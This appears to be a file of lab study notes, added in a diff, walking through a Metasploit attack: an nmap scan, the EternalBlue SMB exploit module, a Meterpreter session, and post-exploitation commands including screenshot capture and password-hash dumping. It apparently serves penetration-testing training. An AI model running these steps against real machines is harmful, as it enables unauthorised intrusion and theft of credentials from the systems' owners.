@@ -1,0 +1,41 @@
+Metasploit
+
+Step 1. Start Metasploit by typing: msfconsole
+
+Step 2. Wait for the Metasploit framework to load.
+Expected Output: You should see the Metasploit banner and a command prompt starting with msf6 >.
+
+Step 3: Scan the Target for Vulnerabilities
+    a. Use Nmap to scan the target machine for open ports and services: nmap -sS -A <target_ip>
+    b. Identify potential vulnerabilities from the scan results. Example Target IP: 192.168.1.100
+
+Step 4: Search for Exploits in Metasploit
+    a. Use the following command to search for a specific exploit: search smb
+    b. Identify a suitable exploit from the search results. Example Exploit: exploit/windows/smb/ms17_010_eternalblue
+
+Step 5: Use the Exploit
+    a. Load the exploit module by typing: use exploit/windows/smb/ms17_010_eternalblue
+    b. Verify that the module is loaded by checking the prompt.
+
+Step 6: Set the Required Options
+    a. View the required options for the exploit: show options
+    b. Set the target's IP address: set RHOST <target_ip>
+    c. Set the local host (your machine’s IP address): set LHOST <your_ip>
+
+Step 7: Launch the Exploit
+    1. Run the exploit by typing: exploit
+    2. If successful, you will gain a Meterpreter session on the target machine. Expected Output: You should see a prompt like meterpreter >, indicating that you have control of the target machine.  
+
+Step 8: Post-Exploitation Tasks
+Use the following commands to gather information from the compromised system:
+    1. sysinfo
+    2. whoami
+ipconfig
+    3. Capture a screenshot from the target machine: screenshot
+    4. Dump the password hashes: hashdump
+    
+Step 9: Exit the Meterpreter Session: exit
+
+Metasploit complete guide: https://www.offsec.com/metasploit-unleashed/
+
+Revise the "eternal blue" machine
